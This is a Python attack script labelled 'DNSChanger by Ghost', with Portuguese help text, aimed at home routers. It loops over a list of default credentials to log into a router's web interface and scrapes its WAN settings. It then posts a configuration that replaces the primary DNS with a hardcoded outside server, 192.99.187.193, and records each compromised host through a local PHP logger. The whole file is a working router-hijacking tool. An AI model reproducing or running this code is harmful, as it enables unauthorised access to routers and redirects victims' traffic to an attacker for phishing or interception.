#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse, requests, os

from scan import password
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description='Script for DNSChanger by Ghost', prog='Ghost', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=100,width=200))
parser.add_argument("-dns1", "--dns1", help = "Define o dns primário", metavar='', default='192.99.187.193', required=False)
parser.add_argument("-dns2", "--dns2", help = "Define o dns secundário", metavar='', default='8.8.4.4', required=False)
parser.add_argument("-host", "--host", help = "Define o ip e porta do router a ser executado", metavar='', default='a', required=False)

args = parser.parse_args()

dns1 = args.dns1
dns2 = args.dns2
host = args.host.replace("http://","")

router = requests.Session()

for x in password.Credentials:
    login = router.get("http://"+str(x)+"@"+str(host))
    if login.status_code == 200:
        user = x
        break

get_dados = router.get("http://"+user+"@"+host+"/internet/wan.asp")

if get_dados.status_code == 200:

    try:
            
        soup = BeautifulSoup(get_dados.content, 'html.parser')

        wanMac = soup.find(attrs={"name": "wanMac"})
        wanMac = wanMac['value']
        
        staticIp = soup.find(attrs={"name": "staticIp"})
        staticIp = staticIp['value']
        
        staticNetmask = soup.find(attrs={"name": "staticNetmask"})
        staticNetmask = staticNetmask['value']

        staticGateway = soup.find(attrs={"name": "staticGateway"})
        staticGateway = staticGateway['value']

        post = {
            'connectionType':'STATIC',
            'staticIp':staticIp,
            'staticNetmask':staticNetmask,
            'staticGateway':staticGateway,
            'dhcpReqIP':'',
            'dhcpVendorClass':'',
            'wan_mtu':'0',
            'wan_mtu_type':'0',
            'wStaticDnsEnable':'on',
            'staticPriDns':dns1,
            'staticSecDns':dns2,
            'natEnabled':'on',
            'wanMac':wanMac,
            'submit-url':'/internet/wan.asp',
            'reboot':'0'
        }

        requisicao_post = router.post("http://"+user+"@"+host+"/goform/setWan", data=post)
        os.system("cd /var/www/html/logs;php gravar.php "+host)
    except:
        pass